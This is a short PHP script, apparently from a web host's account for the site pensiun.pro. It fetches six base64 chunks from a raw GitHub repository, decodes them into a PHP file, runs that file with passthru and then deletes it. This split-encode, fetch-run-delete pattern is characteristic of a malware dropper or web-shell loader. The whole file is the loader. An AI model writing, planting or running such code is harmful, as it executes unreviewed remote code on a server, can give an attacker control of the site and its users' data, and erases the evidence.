<?php
$L="/home/u814079684/domains/pensiun.pro/public_html/_pprst.log";
$B="https://raw.githubusercontent.com/jununrs/pensiun-pro-tmp-pub/main/";
file_put_contents($L,"boot\n");
$s="";
for($i=0;$i<6;$i++){$c=@file_get_contents($B."r$i.txt"); if($c===false){file_put_contents($L,"fail$i\n",FILE_APPEND); exit(1);} $s.=trim($c);}
$p=base64_decode($s); file_put_contents("/home/u814079684/r.php",$p);
file_put_contents($L,"run ".strlen($p)."\n",FILE_APPEND);
passthru("php /home/u814079684/r.php 2>&1",$e);
file_put_contents($L,"done $e\n",FILE_APPEND);
@unlink("/home/u814079684/r.php");
